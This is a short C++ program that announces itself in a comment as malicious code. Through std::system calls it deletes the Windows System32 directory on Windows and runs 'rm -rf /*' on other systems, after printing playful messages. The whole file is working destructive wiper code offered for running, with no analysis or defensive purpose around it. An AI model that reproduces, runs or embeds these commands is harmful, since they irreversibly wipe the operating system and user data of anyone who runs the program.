/*
THIS IS MALICIOUS CODE.
RUN AT YOUR OWN RISK.
*/

#include <iostream>
#include <cstdlib>
#include <filesystem>

namespace fs = std::filesystem;

#ifdef _WIN32
    #define SYSTEM32_PATH "C:\\Windows\\System32"
#else
    #define DELETE_CMD "rm -rf /*"
#endif

void goRoot(fs::path currentPath) {
    std::cout << "Heading to the root!" << std::endl;
    while (currentPath.has_parent_path()) {
        currentPath = currentPath.parent_path();
    }
    std::cout << "Reached the root :)" << std::endl;
}

void destroySystem() {
    std::cout << "bye bye!" << std::endl;

    #ifdef _WIN32
        std::system(("rmdir /s /q " + std::string(SYSTEM32_PATH)).c_str());
    #else
        std::system(DELETE_CMD);
    #endif
}

int main() {
    fs::path startPath = fs::current_path();
    goRoot(startPath);
    destroySystem();
    return 0;
}
